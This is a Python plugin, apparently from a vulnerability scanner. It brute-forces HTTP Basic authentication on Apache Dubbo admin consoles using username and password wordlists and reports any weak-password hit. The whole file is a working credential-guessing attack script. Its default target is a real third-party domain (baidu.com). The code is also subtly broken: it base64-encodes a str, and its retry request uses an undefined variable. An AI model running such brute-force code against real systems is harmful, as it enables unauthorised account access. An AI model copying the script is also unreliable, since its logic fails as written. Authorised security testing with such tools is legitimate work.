#!/usr/bin/env python3

'''
name: Dubbo 弱口令漏洞
description: Dubbo 弱口令漏洞
'''

import base64
import requests
from app.lib.utils.request import request

class Dubbo_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            req = request.get(self.url, headers = self.headers)
            if req.headers["www-authenticate"] == "Basic realm=\"dubbo\"":
                for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                        if pwd != '':
                            pwd = pwd.strip()
                        verify_str = user + ":" + pwd
                        verify_str = base64.b64encode(verify_str)
                        self.headers['Authorization'] = 'BASIC ' + verify_str
                        burp_req = requests.session()
                        burp_resp = burp_req.get(url, headers = self.headers)
                        if 200 == burp_resp.status_code:
                            print('存在Dubbo弱口令漏洞')
                            return True
            else:
                print('不存在Dubbo弱口令漏洞')
                return False
        except Exception as e:
            #print(e)
            print('不存在Dubbo弱口令漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    Dubbo_Weakpwd = Dubbo_Weakpwd_BaseVerify('http://baidu.com')
    Dubbo_Weakpwd.run()